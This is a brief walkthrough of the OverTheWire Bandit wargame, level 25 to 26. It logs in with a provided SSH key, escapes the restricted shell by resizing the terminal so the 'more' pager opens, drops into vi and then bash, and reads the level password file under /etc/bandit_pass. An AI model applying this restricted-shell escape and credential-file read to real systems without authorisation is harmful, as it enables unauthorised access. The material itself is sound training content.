OverTheWire Bandit: Level 25 → 26

Objective
Obtain the password for Level 26.
The login shell for bandit26 is restricted, but an SSH private key is provided and can be abused using a pager escape.

Steps
Log in as bandit25:
ssh bandit25@bandit.labs.overthewire.org -p 2220
Use the provided SSH key to log in as bandit26:
ssh bandit26@localhost -i bandit26.sshkey
When the pager (more) opens, resize the terminal to trigger it, then escape to a shell:
v
:set shell=/bin/bash
:shell
Read the password file:
cat /etc/bandit_pass/bandit26

Result
The password for Bandit Level 26 is displayed.
